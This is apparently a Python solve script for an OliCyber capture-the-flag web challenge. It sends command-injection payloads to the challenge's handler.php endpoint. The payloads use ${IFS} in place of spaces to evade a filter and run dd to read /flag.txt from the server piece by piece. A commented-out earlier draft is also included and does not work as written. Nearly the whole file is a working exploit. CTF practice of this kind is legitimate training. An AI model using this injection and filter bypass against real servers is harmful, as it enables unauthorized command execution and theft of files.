'''
import requests
from time import sleep

s=requests.Session()
url="http://timp.challs.olicyber.it"
r=s.get(url)
print(r.text)
sleep(1)
print("--------------------------------------------------------------------------------------------------------")

for i in range(1,50,10):
    
    payload={f"cmd={mycmd}"}
    r=s.post(url,data=payload)
    print(r.text)
'''  

import requests

url = "http://timp.challs.olicyber.it/handler.php"

headers = {
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0",
    "Accept": "*/*",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "X-Requested-With": "XMLHttpRequest",
    "Origin": "http://timp.challs.olicyber.it",
    "Connection": "keep-alive",
    "Referer": "http://timp.challs.olicyber.it/",
    "Priority": "u=0",
}

# body esattamente come in --data-raw (percent-encoded)

flag=''
s = requests.Session()
for i in range(0,50,10):
    mycmd="dd${IFS}if=/flag.txt${IFS}bs=1${IFS}skip="+str(i)+"${IFS}|${IFS}more"
    data = {"cmd": mycmd}
    r = s.post(url, headers=headers, data=data)
    flag+=r.text
    print("\r"+flag, end="", flush=True)
